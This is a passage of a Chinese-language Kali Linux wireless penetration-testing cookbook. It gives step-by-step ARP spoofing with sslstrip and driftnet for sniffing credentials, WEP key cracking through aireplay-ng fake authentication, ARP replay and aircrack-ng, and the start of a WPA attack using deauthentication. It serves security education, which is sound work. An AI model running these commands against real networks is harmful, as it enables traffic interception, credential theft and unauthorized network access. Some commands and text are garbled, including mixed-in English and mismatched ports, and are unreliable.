就 IP 到 MAC 地址解析和组合而言，有两面。ARP 用于将 IP 地址解析为 MAC 地址。然而，还有一个伴随协议称为 RARP（反向地址解析协议），它用于将 MAC 地址解析为 IP 地址。虽然这两个协议存在于彼此的伴侣中，但我们实际上只需要 ARP，而不是反向 ARP。然而，重要的是要知道存在一个伴随协议。

# 准备工作

要开始操作，您需要准备好以下项目：

+   能够进入监视器模式的无线网卡

+   Kali Linux

这里列出的项目是基本要求，如果需要，您可以轻松地使用更多（或不同）组件。例如，如果您想要增强范围，可以使用一个带有外部天线连接的基于 USB 的无线网卡，以获得更好的接收效果。

第一步是启用 IP 转发；这样可以使流量通过攻击者的系统进行重定向。要执行此攻击，我们执行以下命令：

```
#echo "1″ > /proc/sys/net/ipv4/ip_forward 
```

查看 IP 转发的设置值；这将返回一个值`1`。如果没有，重复前面的步骤：

```
#cat /proc/sys/net/ipv4/ip_forward 
```

输出将是：`1`

```
#sysctl -p 
```

请注意，这里的`1`表示我们正在启用 IP 转发。如果我们想要关闭此功能，可以使用`0`来运行相同的命令。

下一步是在流经我们系统时重定向流量，这很容易通过使用`iptables`命令来实现。

在这个设置中，接收到端口`80`的流量将被重定向到不同的端口号。在这种情况下，端口`80`被重定向到端口`8080`，端口`443`被重定向到端口`8883`。有了这组简单的规则，流量将被相应地重定向。

要实施我们的设置，我们只需在命令行中输入以下内容：

```
#iptables -t nat -A PREROUTING -p tcp -destination-port 80 -j REDIRECT -to-port 8880 
#iptables -t nat -A PREROUTING -p tcp -destination-port 443 -j REDIRECT -to-port 8883 
```

iptables 是一个命令行实用程序，它在 Linux 中已经存在很长时间，用于配置 Linux 内核中的防火墙设置。该实用程序比这里介绍的要复杂得多，但我们只需要使用基础知识来进行设置。

现在来到重要的部分，即执行实际的 ARP 欺骗。为此，我们将使用`arpspoof`命令来更改受害系统的缓存以包含不同的值。在这种情况下，我们将把默认网关更改为其他内容。我们可以使用以下命令来实现：

```
arpspoof -i interface -t target-ip target-gateway-ip 
```

更具体地说，我们将更改受害机器以包含网关的不同地址：

```
arpspoof -i eth0 -t 192.168.1.23 192.168.0.253 
```

我们也可以对网关执行相同的操作，就像这样：

```
arpspoof -i eth0 -t 192.168.0.253 192.168.1.23 
```

完成这些步骤后，我们将进入一个阶段，在这个阶段我们可以拦截网络中传输的请求。在 Kali 中，我们在这种情况下有一些信息收集的选择，比如`sslstrip`/`drifnet`。让我们简要地看一下如何设置每个选项。

`sslstrip`是一个嗅探和中间人工具，旨在捕获通过 SSL 协议传输的信息。使用这个命令，诸如用户名、密码、电子邮件账户和数据库用户详细信息等信息都有可能被拦截。

以下命令将允许攻击者嗅探目标 PC `192.168.1.23` 的流量，并指定`iptable nat`规则中定义的端口：

```
python /usr/share/sslstrip/sslstrip.py -p -s -l 8880 
```

等一会儿，记录在`/usr/share/sslstrip/sslstrip.log`中的嗅探数据，或者您可以使用用户定义的文件来转储捕获的数据。

另一个有趣的工具被称为`driftnet`。Driftnet 是一个基于 GUI 的工具，旨在捕获从浏览器访问的任何内容。这个工具非常简单易用，只需在命令行中使用`driftnet`命令，结果将随着流量的流动而开始出现。以下是使用该工具获得的输出示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/f333b299-fb67-490f-baf5-f019b45eb538.jpg)

driftnet 命令的输出


# 第六章：身份验证攻击

在本章中，我们将涵盖以下内容：

+   WEP 攻击

+   WPA 攻击和 WPA2 攻击

+   攻击 WPS

# 针对身份验证的攻击

在本章中，我们将探讨另一种形式的攻击：针对身份验证机制及其周围系统的组件的攻击。对无线网络上的身份验证机制进行攻击可以使攻击者能够非常轻松地或几乎毫无阻力地访问系统的部分和其中托管的资源。实际上，设置身份验证机制的原因是为了能够验证用户或主机的身份，如果这种验证被颠覆或绕过，那么我们最终会面临各种访问和操作。然而，在进入本章之前，让我们先看看身份验证是什么，它的设计目的是什么，以及它如何以非常抽象的形式工作，然后我们可以利用这些知识更好地理解本章中的攻击。

首先让我们开始谈论当用户尝试登录系统时会发生什么，实际上任何系统都是如此。当用户登录系统时，他们将经历一系列事件。他们首先要做的是提供一个身份，这是关于他们声称自己是谁的陈述。现在，身份本身并不能用来允许访问系统，因为它只是对某人的声明或断言；它并没有任何明确的意义。这意味着我可以声称自己是电影明星、政客，甚至是美国总统，但如果没有提供一些东西来验证身份，那么这只是一个没有任何价值或权重的声明，因此不足以进入后续授予对受信任信息资源访问的步骤。为了做到这一点，我们需要转向身份验证步骤。以下图表显示了身份验证过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/9130aed4-b931-416a-a7fe-26172fb6a1a3.png)

身份验证过程

当我们说身份验证时，我们正在执行一些行动，证明用户关于自己是谁的声明实际上是有效的。最常见的方法是通过使用密码；我们中的许多人都遇到过这样的情况，我们提供用户名（即我们的身份），然后提供密码，这是只有我们知道的秘密信息，可以用来证明我们是我们所说的那个人，你可以信任我们。因此，可以看到，仅仅以用户名的形式的身份本身是不足以证明任何事情的；它必须经过身份验证，以验证该方可以通过提供只有具有该身份的人才会知道的答案来证明可以信任。他们正在进行身份验证的系统将有某种方式来比较他们提供的答案（或在这种情况下是密码）与他们已经本地存储的东西，以确保提供的答案是正确的。以下屏幕截图是 Windows 登录框的一个示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/e079316a-33da-43ef-ae7b-5d4f03847fe7.png)

登录框

实际上，有三种公认的身份验证方式，应该被视为对资源进行身份验证的一般类别。为了完善你对这些不同方式的了解，让我们简要地看一下每种方式：

+   因素 1 身份验证涵盖了任何需要提供信息（如密码、口令或 PIN 码）以验证身份的情况。身份验证的第一个因素的重要细节或要素是，这是你知道并存储在大脑中的东西，并在请求时提供。这是计算机网络和软件以及我们的无线网络中最常用的身份验证形式，正如我们将看到的那样。

+   双因素认证涵盖了任何需要提供物理物品来验证个人或系统的情况。例如，门的钥匙、ATM 卡或者令牌都可以用来呈现给系统或生成一个特殊代码，用于验证用户的身份，就像之前一样。这种形式的认证有时也被称为你所拥有的东西，就像你拥有汽车门钥匙一样。这种类型的认证在无线网络中并不常见，但也有一些例外情况，比如在需要生成特殊代码登录企业网络或访客网络的情况下。

以下照片显示了双因素认证技术的一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/20b742ad-e0a9-495e-ac83-0d9cf622fe39.png)

RSA 实验室的双因素认证令牌

+   第三因素认证是一种依赖于所谓的生物识别的认证形式。简单来说，生物识别是一种通过测量生物体的特征或特质并将其用作验证身份的方法，就像你在前两个因素中所做的那样。诸如指纹、眼球、手掌纹甚至面部识别等特征都被用来提供这种认证因素。虽然这种认证形式可能非常准确和可靠，但它与其他因素相比有一个缺点，这使得它不太常见，因为在设置这种系统时涉及的费用和复杂性更大。值得注意的是，在无线网络中很少见到这种类型的认证因素。这并不意味着你不能使用这些认证机制来连接无线网络；这只是意味着它们在大多数情况下不用于连接无线网络的认证。这种认证类型只是包含在这里供你参考。这不是我们在本书中要试图颠覆或规避的内容。以下图片显示了第三因素认证技术的一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/7124d2b1-8c18-4817-86d7-031402cc3731.jpg)

第三因素指纹识别器

现在我们已经讨论了认证，接下来要讨论的是系统在验证了你所声称的身份后会发生什么。请记住，认证所做的只是验证你向系统提供的身份不仅仅是一个声明，它实际上是真实和正确的，并且可以被信任为准确。这绝不意味着你已经被授予了对系统的访问权限。可以把它想象成向官员提供驾驶执照或其他一些信息。仅仅因为那些文件核实并且说你是你所声称的人，并不意味着你将被允许，例如，进入受限区域或执行其他一些操作，因为它只是证明你是你所声称的人，仅此而已。要想进入下一步，你必须经历一个称为授权的过程。

那么，什么是授权？授权实际上非常简单。授权将你的验证身份与系统上配置的一组规则进行比较。这些规则用于确定你与系统的具体访问和交互级别，并由系统所有者管理员根据他们的指导和希望制定的标准进行配置和实施。

一旦授权完成，用户将以系统所有者希望他们拥有的任何能力或级别访问系统。因此，他们可以继续进行被授予的任何交互。

在认证中需要记住的一点是，认证并不局限于无线。它在控制对不同应用程序、设备、网络和其他项目的访问中起着作用。没有认证，系统和设备的安全性将会变得更加具有挑战性，因此它必须存在于各种各样的项目中。在本章中，我们讨论了无线设备和技术的认证，但不要忘记，它不仅存在于无线中，还存在于通过无线访问的网络应用程序以及通过传统有线方式访问的应用程序中。

在无线网络中，有许多可以针对认证的攻击，我们只能在这本书中覆盖其中的一部分。但我们将覆盖的这些攻击是一些比较常见的，你可能会遇到的，它们可能会影响无线网络和性能。无线网络上的认证包括多种技术和机制，其中许多我们在之前的章节中已经涵盖了，但为了完整起见，让我们在这里谈谈其中的一些不同项目：

+   **加密**：加密的使用在几乎所有可用的认证机制中都是至关重要的，因为它提供了一种方式来确保凭据的机密性以及存储这些凭据的系统的完整性。没有加密，保护凭据在存储和传输时将会非常困难。同样，要确保这些凭据在网络上传输时是准确的，或者它们是否已经被改变，也将会非常困难。可以说，没有密码学，我们现在许多形式的认证将不会存在。

+   **预共享密钥**（**PSK**）**系统**：这涉及使用在每台工作站或设备上输入一个共同密钥，以允许其对无线接入点进行认证的系统。这种保护通常以非企业 WEP、WPA 或 WPA2 的形式出现。值得注意的是，预共享密钥系统在家庭和小型企业环境中非常常见，但当你开始将环境扩展到中型、大型和企业规模的环境时，预共享密钥系统往往会被避免，而更倾向于使用企业认证系统。

+   **企业认证**：在大型环境中，使用重型认证系统形式的企业认证机制并不罕见。这些机制允许认证的扩展以及认证的集中控制和管理。这意味着这些认证系统不仅可以为在这种情况下认证无线客户端提供强大的认证方式，还可以用于为授权设置统一的规则，甚至可以针对每个站点对这些规则进行微调。

虽然这只是企业认证中的三个部分的列表，但还有许多其他可能被部署的部分。然而，我们将避免深入研究一些更为奇特和复杂的形式，只专注于你在探索中最有可能遇到的基本形式。

# 攻击类型

针对无线网络上的认证的攻击是多种多样的，每种攻击都有其自身的优势和劣势，使它们在特定情况下有用或无用。

在我们开始探索每一种攻击之前，让我们先列出本章将涵盖的攻击。

+   WEP 攻击

+   WPA 攻击

+   WPA2 攻击

+   WPS 攻击

请记住，这些只是可以用来颠覆无线网络认证的攻击类型中的一部分；它们不应被视为唯一的攻击类型。

# WEP 攻击

我们将在本章中重新审视对有线等效隐私（WEP）协议的攻击。在我们阅读本书的过程中，我们已经几次遇到过这个协议，我们将在这里再次对其进行审视，并添加一些之前没有的内容，并努力扩展这次攻击，以讨论这个协议中真正的弱点，使其容易受到攻击。

请记住，WEP 协议是在无线安全被认为是一个问题的时候实施和设计的，但设计无线技术的人并没有真正理解如何正确实施安全，也没有咨询可能帮助他们更好地做到这一点的外部团体。在所有实际意义上，WEP 不应再在任何活跃的网络中使用，因为它对于希望通过窃取您的数据或在传输过程中修改您的网络上的数据来对您造成伤害的人来说，它太容易成为一个机会目标。几年前，对这个协议的成功攻击要比现在更难以成功进行，因为所需的工具需要更高程度的知识和经验才能操作。如今，专门针对这个协议的工具更加精细和易于使用，并且可以被更广泛的受众所接触；他们只需要了解这些工具，并愿意遵循一些烹饪书式的指导来使它们以一种实现成功结果的方式工作。

让我们在 WEP 协议上填补一些更多的背景故事，以充分阐明我们所探讨事物的角度。这个协议早在 1997 年设计，作为最初的无线标准的一部分。它旨在使用一个相当强大的加密协议，称为 RC4，旨在保护流量免受意外泄露，并使用 CRC 32 进行完整性保护。这些保护措施都不是一个坏决定。然而，在 WEP 的设计和实施中却被错误地使用了。

要理解 WEP 的问题之一，我们需要了解在这个协议中如何生成密钥。实际上，标准的 64 位 WEP 协议使用了一个 40 位密钥加上一个 24 位的初始化向量或 IV，它们一起形成了所谓的 RC4 密钥。这个密钥是用来在传输过程中加密和保护流量的。

敏锐的读者很快就会注意到，我们使用 40 位密钥加上 24 位初始化向量是一个问题 - 具体来说，40 位密钥是一个我们需要关注的大问题。在当时决定这个 40 位数字时，技术已经可以很容易地在合理的时间内破解短版本的密钥。如今，破解这种密钥是极其容易的，几乎不需要任何时间。因此，不可避免地会出现一个问题，即为什么这个协议的开发人员决定在大多数情况下更长的加密密钥更强大更好时使用如此短的密钥。最大的原因是，在 WEP 设计时，美国政府对加密技术和任何实施或使用这种加密工具的技术或设备实施了严格的出口管制。正是由于这些限制，密钥大小被限制到了这样的程度。之后，在这些限制解除后，密钥长度增加到了 104 位加上 24 位的初始化向量。还有一些更长的链接可用，但即使使用这个 128 位的密钥大小，该协议仍然存在漏洞，因此不应使用。

在大多数使用 WEP 的接入点中，密钥是以十六进制值输入的，或者被转换为十六进制值，这意味着它使用了包括`0`到`9`和`A`到`F`的值的密钥。使用 WEP 的消费者或系统管理员将直接在接入点上输入他们的密钥，然后在所有希望连接的客户端上输入相同的密钥，一切都会按预期工作。

在 WEP 加密系统中可以利用的一些内容是我们关心的，这些内容是用于识别客户端而不是用户的不同类型的认证。两种认证方法是**开放系统认证**（**OSA**）和**共享密钥认证**（**SKA**）。这两种方法都在不同程度上得到了使用，大多数人选择后者而不是前者，尽管前者在一些情况下也有所见。

在 OSA 的情况下，客户端能够连接到无线接入点而无需提供任何凭据或任何标识自己的东西。实际上，任何客户端都能够直接认证到接入点并关联。这实际上意味着，即使系统的名称中有这样的说法，实际上根本没有进行任何认证。然而，客户端随后可以通过拥有 WEP 密钥来加密他们的流量。这意味着必须向客户端提供密钥才能实现这一点。

在我们的第二种认证机制中，即共享密钥，客户端将不得不提供 WEP 密钥来认证网络，以便正确关联和在该网络上进行通信。实际上，这可以分解为一个四步过程，我们应该谈谈以了解我们正在处理的过程以恢复我们的密钥：

1.  客户端将发送一个请求来认证无线网络，或者特别是一个接入点。

1.  接入点将对关联请求做出回应，发送一个明文消息或挑战。

1.  然后，客户端将获取这个明文消息，并使用预先配置的 WEP 密钥对其进行加密，然后将结果传回接入点作为另一个认证请求。

1.  此时，接入点将获取 WEP 密钥的副本，用它来解密它收到的加密密钥，然后将得到的结果与其原始明文响应进行比较；如果结果匹配，则将进行关联。如果不匹配，则将被拒绝。下图显示了 WEP 过程的过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/c5a16ebc-2aae-4a0d-ac07-a9244684b452.png)

WEP 认证过程

解密过程完成后，WEP 密钥不会被推到后台等待另一个认证的发生；相反，它现在用于加密客户端与网络或接入点上的任何其他点之间传输的流量。

真的很重要的一点是，尽管共享密钥认证更安全是一个明显的观点，因为在允许客户端关联到网络之前进行了认证，但实际上并不是这样。事实上，情况恰恰相反，因为在共享密钥系统中，数据在加密之前进行交换，如果密钥很短，就有可能从认证客户端到网络的序列中提取密钥。

这个协议的构造方式以及提供的密钥链接导致了一些明显的问题，使我们的攻击机会和成功率相当高。您应该研究为什么这是可能的，这样我们就能理解我们使用的攻击为什么如此有效。首先，让我们了解 RC4 是一种对称和流密码，如果在相同的数据传输过程中使用相同的密钥两次，它会迅速失去效力。如果密钥被重复使用，就会打开一个门，允许我们比较流量并寻找可能揭示密钥的模式。设计者决定打败这种情况的方式是使用一个 24 位的初始化向量，当与 40 位密钥结合使用时，旨在防止在相同的传输过程中重复使用密钥。然而，初始化向量的短 24 位长度意味着在足够繁忙的网络上，相同的密钥被重复使用的机会会大大增加。事实上，仅仅举个例子，大约传输 5000 个数据包后，相同密钥被重复使用的机会就会增加到约 50%。因此，可以想象在足够繁忙的网络上，您可以很快地收集到这么多数据包。事实上，我们的攻击依赖于我们能够捕获数千甚至数十万个数据包，并使用它们成功地恢复密钥。

为了让您了解成功并快速破解该协议有多容易，可以考虑一些已有记录的案例。2005 年，有人展示了可以在大约三分钟内从无线网络中恢复使用该协议的 WEP 密钥，甚至在环境允许的情况下可能更短。随后几年出现的攻击进一步缩短了这个时间，有些人甚至声称他们能够使用不到 40,000 个数据包就成功地恢复密钥，每次成功的概率超过 50%。这应该让人明白为什么这不是一个好的协议，仍在使用它的人应该受到鼓励并远离这项技术，以免陷入困境。

# 准备工作

要开始，您需要准备以下物品：

+   一个能够进入监视模式的无线网卡

+   Kali Linux

+   第二个有线或无线适配器连接到互联网

# 如何操作...

为了破解运行该协议的接入点的 WEP 密钥，需要一个过程，其中需要收集所谓的**初始化向量**（**IVs**）。这个过程的问题在于，在正常情况下，网络在短时间内不会生成大量的这些项目。在正常情况下，这意味着我们需要等待很长时间才能获得足够的 IVs 来检索网络密钥。然而，我们可以通过利用前面教程中的信息以及一些新技能来加快这个过程，以检索密钥。简而言之，我们将试图向网络注入数据包，以促使接入点在较短的时间内生成大量数据包，从而增加捕获具有弱 IVs 的数据包的能力。

完成这个过程后，我们可以使用捕获的流量来检索密钥。

简而言之，在这个教程中，我们将要学习的步骤是：

1.  在特定的 AP 频道上启动无线接口的监视模式。

1.  测试无线设备对接入点的注入能力。

1.  使用`aireplay-ng`与接入点进行虚假认证。

1.  在 AP 频道上使用`bssid`过滤器启动`airodump-ng`以收集新的唯一 IVs。

1.  使用`aireplay-ng`以 ARP 请求重放模式注入数据包。

1.  运行`aircrack-ng`使用收集的 IVs 来破解密钥。

我们打破 WEP 的第一步是像之前一样将我们的卡切换到监视模式。在大多数情况下，安装在你的系统中的卡，如果你的系统配备了内置无线网络适配器，将很容易地能够切换到监视模式。如果不行，那么你可以随时选择第三方适配器，比如 USB 适配器或直接安装到系统中以支持这种功能的适配器卡。我们需要这种模式来允许网络接口检测附近网络发送的每个数据包，而不与这些网络关联。要在名为`wlan0`的网络接口上执行此操作：

1.  `airodump-ng start wlan0 9`（`9`将锁定卡监听频道`9`，但这可以更改为你想要观察的接入点的频道。你可以通过在没有频道指示符的情况下运行命令来发现你想要定位的接入点的频道）。

1.  按`Enter`键。

记住的一个重要细节是，大多数无线网络往往在`1`、`6`或`11`中的一个频道上运行。原因是这是在这个范围内唯一不完全重叠的三个频道，因此如果你使用其中一个，干扰的风险会降低。你可以使用这里没有指定的其他频道，但可能会遇到一定程度的干扰，可能会比你想要的更高。在这个示例中，我只使用了频道`9`。当你扫描你所在区域的目标时，检查你想要使用的目标的频道，并使用该频道。

一旦卡响应说它处于监视模式，我们现在可以继续下一步，即准备好对目标网络执行数据包注入。所以，验证你在屏幕上收到的任何提示是否验证了你确实已经切换到了指定频道的监视模式，然后你可以继续。如果你没有得到一个表明你已经切换到监视模式的响应，那么请重试命令，看看也许你输入了错误的东西或者你遇到了其他问题。

我们的下一步是确保我们处于一个可以正确执行我们对目标网络的数据包注入的情况。所以我们要验证我们是否足够接近或者信号足够强，能够执行这个数据包注入并得到我们想要的结果。幸运的是，我们有一个旨在帮助我们应对这种情况并确保我们在需要的位置的工具：

```
aireplay-ng -9 -e ganon -a 00:28:6C:E4:40:80 wlan0
```

`-e ganon`是无线网络的名称，`-a 00:28:6C:E4:40:80`是接入点的 MAC 地址。

系统应该会响应一个等待信标帧的提示，很快它也应该会响应说注入过程正在进行，并且它已经找到了你定义的接入点。如果你没有得到这个响应以及指示频道、速度甚至功率的信息，那么你可以尝试靠近你的目标或改变位置，甚至考虑使用天线或不同的适配器来获得更好的信号。

理想情况下，此时你应该得到的响应应该表明你接收到了接入点或目标网络近乎 100%的信号。如果你得到任何表明你接收到的信号少于 100%的东西，这不一定是坏事，但当你下降到 90%，然后 80%，然后 70%以下时，你会得到一个不太可靠的信号，这可能会影响这次攻击成功的机会。不要总是期望得到 100%的信号或响应，但你希望得到尽可能接近的东西。较小的值可能会成功，你不一定要让一个较低的值阻止你尝试攻击，但要意识到你可能会得到不太理想的结果。

现在，通过上述步骤，我们可以继续进行实际捕获初始化向量或 IVs 的步骤。如果您还记得这次攻击的介绍，这是确保相同密钥不会一次又一次地在流量中重复使用的关键项目。我们还了解到，初始化向量的短长度导致在高容量网络上的流量可能在仅传输了 5000 个数据包后就重复使用相同的密钥。因此，我们需要准备好捕获这些流量。

为了做到这一点，您将打开第二个控制台会话。因此，在 Kali 界面中打开第二个控制台会话来运行以下命令（不要关闭第一个控制台）：

```
airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output wlan0 
```

“-bssid 00:14:6C:7E:40:80”是接入点的 MAC 地址。这可以消除多余的流量。`-w`捕获是包含 IVs 的文件的文件名前缀。

一旦执行了这个命令，您将开始看到流量被捕获——尽管与我们接下来要做的生成更多流量的步骤相比，速度非常慢。请记住，WEP 在生成 5,000 个数据包后有超过 50%的机会重用密钥。因此，我们想要制造一种情况，即在很短的时间内生成大量数据包。如果您只是等待并观察屏幕上生成的内容，就像您现在所处的阶段一样，您会看到数据包或信息的数量以渐进且不稳定的速度增加。

理论上，您可以以网络的正常速度收集流量，但请记住，如果我们必须生成或收集数千个数据包才能成功增加我们的成功机会，您可能需要等待一段时间。网络越不活跃，您 passively sitting by and in a short period of time collected enough trafficking to be able to recover the key. In fact, it is possible you could find yourself waiting and listening for two or three days just for enough traffic to successfully recover the key. That can be a little challenging and also dramatically increases your chances of being detected.

现在我们将对接入点执行身份验证。我们需要这样做是因为我们将要向无线网络注入数据包，为了能够做到这一点，我们需要创建一个身份验证。如果我们没有经过身份验证和关联网络，那么我们会遇到一个情况，我们的连接尝试将被直接拒绝并失败。我们正在进行的是伪身份验证，并尝试连接到网络。我们这样做的方式是通过获取已成功关联到该无线网络的客户端的 MAC 地址。

为了将客户端与接入点关联，我们将使用伪身份验证：

```
 aireplay-ng -1 0 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0 

-1 means fake authentication 
0 reassociation timing in seconds 
-e ganon is the wireless network name 
-a 00:14:6C:7E:40:80 is the access point MAC address 
-h 00:0F:B5:88:AC:82 is our card MAC address 
```

或者对于挑剔的接入点的另一种变体：

```
aireplay-ng -1 6000 -o 1 -q 10 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0 

6000 - Reauthenticate every 6000 seconds. The long period also causes keep alive packets to be sent. 
-o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs. 
-q 10 - Send keep alive packets every 10 seconds. 
```

如果一切顺利，您应该会收到一条消息，表示您已成功关联。如果没有，您将收到一条消息，指示您未能成功关联到无线网络，那么您需要在那时再次尝试，但通常情况下，如果您遵循这里的步骤，您应该更有可能关联到您的目标。如果您通过欺骗受害者的 MAC 地址成功关联和身份验证到无线网络，那么您将无法继续进行下一步。

现在让我们进入决定性时刻，我们将生成或诱导我们的目标网络生成流量，以便恢复密钥。这个过程的工作原理是使用一种称为 ARP 请求或广播的东西。我们试图做的是发送一个 ARP 请求，就像任何正常的网络客户端一样。然而，当这个广播寻找客户端时，访问点会按设计原理将其重新广播到网络中，每次我们发送一个广播时都会这样。因此，它会产生大量流量，这些流量又被 WEP 密钥加密和保护。由于我们将监听和捕获这些流量到一个文件，如果一切顺利，我们将记录使用密钥的大量流量（如果我们有耐心），并且我们可以对其进行破解或恢复操作。

要执行注入，我们需要打开另一个控制台并输入：

```
 aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0 
```

它将开始监听 ARP 请求，当它听到一个请求时，`aireplay-ng`将立即开始注入它。

您可以通过检查您的`airodump-ng`屏幕来确认您正在注入。数据包应该在迅速增加。`#/s`应该是一个相当不错的数字。然而，“相当不错”取决于许多因素。典型范围是每秒 300 到 400 个数据包。它可能低至每秒 100 个，高至每秒 500 个。

现在我们已经将流量捕获到一个`.cap`文件中，我们现在将尝试从捕获的数据包中检索密钥。为此，我们执行以下操作：

打开另一个新的控制台会话并输入：

```
 aircrack-ng -b 00:14:6C:7E:40:80 output*.cap 

-b 00:14:6C:7E:40:80 selects the one access point we are interested in.  

*.cap selects all files starting with "output" and ending in ".cap". 
```

您可以在生成数据包的同时运行此操作。在短时间内，WEP 密钥将被计算并呈现。对于 64 位密钥，您大约需要 250,000 个 IV，对于 128 位密钥，您需要 1,500,000 个 IV。请注意，这些值只是粗略指导，其他变量可能会影响您实际需要收集多少流量和 IV。

如果过程成功完成，您应该会看到类似以下的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/b9affb85-dba9-4dbe-a58e-b201479de225.jpg)

请注意，密钥不会像您期望的那样显示。在`Key Found`旁边的字符，方括号之间，是十六进制的通行证。如果您删除冒号，然后将剩余的字符粘贴到无线客户端提示与网络关联时，它仍然可以工作。

# WPA 和 WPA2 攻击

我们的下一个攻击目标是一种称为 WPA 或 Wi-Fi 保护访问的技术。正如我们在之前的教程中所看到的，WEP 有很多缺点和漏洞，可以很简单地利用这些漏洞来访问并暴露使用该协议保护的网络上的信息。由于 WEP 的漏洞和问题，人们寻求了一种替代方案，而 WPA 就是一个立即可用的替代方案。WPA 旨在成为 WEP 的更新或升级，可以严格通过无线网络卡和能够支持新标准的无线访问点的固件升级来实现。当引入这项新技术时，它解决了 WEP 带来的许多问题，并让系统管理员和消费者稍微放心了一些。

需要注意的是，虽然大多数无线网卡可以通过简单的固件更新来包含 WPA 的新功能和能力，但并非每个无线网卡都可以通过固件升级来支持新技术。在某些情况下，无线网络卡必须直接更换，以便利用新技术。另一方面，用于锚定无线网络的接入点需要进行比标准固件更新更广泛的升级和工作。因此，大多数在 2003 年之前可用的接入点无法升级以支持 WPA，这意味着用户必须替换这些接入点而不是升级它们。在大多数情况下，这是因为旧硬件没有足够的处理能力来支持新标准中看到的更强大的要求。

WPA 建立在一个称为 IEEE 802.11i 的标准上。该标准定义了许多内容，其中并非所有内容都会立即在 WPA 中实施；一些内容需要等待更新的 WPA2 标准协议才能实施。然而，从这个标准中，我们看到了所谓的暂时密钥完整性协议（TKIP）的实施。这项技术旨在取代 WEP 使用的 64 位或 128 位密钥。通过这种新协议，密钥会动态地基于每个数据包生成，每个数据包都有一个新的 128 位密钥，这意味着我们在 WEP 中看到的攻击在 WPA 中不再可能。以下图片显示了 WPA 的过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/585a5cb5-ef65-46d3-8988-0b31b371b92f.jpg)

WPA 的过程

WPA 还更新和简化了 WEP 中存在的完整性检查。WPA 使用所谓的消息完整性检查，旨在执行与先前技术相同的目的，这意味着它旨在阻止攻击者更改或重新发送数据包，即所谓的数据重放攻击。替换旧 CRC 协议的原因是，旧协议实际上并不足以保护所有类型的数据完整性检查和重放攻击。因此，决定应该在 WPA 中实施新的消息完整性检查，这实际上在许多形式上已经使用了一段时间。值得一提的是，一些旧的网络卡和接入点无法升级到新的 WPA 协议的原因之一是，消息完整性检查实际上比 WEP 中使用的旧 CRC 检查更需要计算能力。

需要注意的是，自从实施了带有消息完整性检查的更新的 WPA 协议以来，发现了与该技术相关的一些缺陷。同样重要的是，总体上在 WPA 中使用的加密技术也被发现存在缺陷。然而，同样重要的是，尽管 WPA 存在缺陷，但它们并不像 WEP 中存在的那些缺陷那样引人注目和明显。然而，归根结底，如果有升级到 WPA2 的选项，应该选择这个选项，而不是停留在 WPA 甚至 WEP 上。

WPA 协议中有一些与认证相关的术语，你应该知道：

+   **WPA 个人**：这种认证机制，也称为 WPA-PSK，主要针对不需要或没有集中认证系统的家庭和小型办公网络。在这种设置中，每个无线设备将从共享的 256 位密钥派生出独特的 128 位加密密钥。这个密钥将分别输入到接入点和连接到这个接入点或无线网络的每个个体客户端中。这个密钥可以按照需要以 64 个十六进制数字或 8 至 63 个字符的密码短语输入。

+   **WPA 企业**：这是一种有时也被称为 WPA-802.1x 的认证模式。这种设置适用于企业级网络，并依赖于存在并可以配置支持这种部署的集中式认证服务器或系统的事实。在企业级网络中，预期会存在一个集中式认证系统，因为它非常适合这些环境。它也有一个缺点，就是比 WPA 个人有着更复杂的设置，然而，通过这种额外的设置和复杂性，我们也得到了与共享密钥系统相比更多的安全性的好处。以下图片展示了 WPA 企业认证过程的概念：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/4b37f7dc-dadb-4085-9a91-2f2b1049214b.png)

WPA 企业过程

+   **Wi-Fi 保护设置**：这项技术，也称为 WPS，是另一种已经在 WPA 和 WPA2 中实施的认证机制。它旨在用于消费者希望简化与密钥相关的配置过程的情况。使用这项技术，消费者可以简单地在访问点和他们的无线设备上点击几个按钮（如果支持 WPS），设备将执行握手类型的操作并交换密钥，以允许与无线网络的通信进行。这项技术的好处是方便，但也有开放无线网络环境中的一个重大漏洞。因为这是我们在关于 Wi-Fi 时的一个重要关注点，我们将在本章的后续配方中介绍这项技术以及如何打败它。

# 准备工作

为了开始，你需要准备好以下物品：

+   一个能够进入监视模式的无线网卡。

+   Kali Linux

+   第二个有线或无线适配器连接到互联网。

# 如何做...

在这个特定的配方中，我们将通过一些步骤来破解使用弱密码短语的 WPA：

1.  打开一个终端窗口，找到无线适配器的名称。很可能这个适配器的名称会是`wlan0`之类的东西。你应该使用`ifconfig`或`iwconfig`来查找。

1.  现在我们使用`airmon-ng`在步骤一中注意到的接口上启用监视模式：

```
airmon-ng start wlan0 
```

对于一些无线网卡，当你尝试在它们上启用监视模式时，你可能会收到一个错误消息。如果发生这种情况，使用`airmon-ng`check kill 命令。

1.  接下来，使用以下命令查看目标接入点的列表以及连接到这些接入点的客户端：

```
 airodump-ng wlan0 
```

1.  现在，保持这个终端打开，因为它将帮助我们知道我们的攻击是否成功。我们将为以下步骤打开一个新的终端窗口。

1.  现在，在下一步中，我们将尝试从被攻击的无线网络中捕获空中数据包：

```
 airodump-ng -c channel -bssid [bssid of wifi] -w [path to 
    write the data of packets]   wlan0mon[interface]. 
```

1.  接下来，我们想要取消连接到 Wi-Fi 的连接的客户端：

```
 aireplay-ng -deauth 10 -a [router bssid] interface 
```

在上述命令中，给出客户端 MAC 地址是可选的；它由`-c <client mac>`给出。

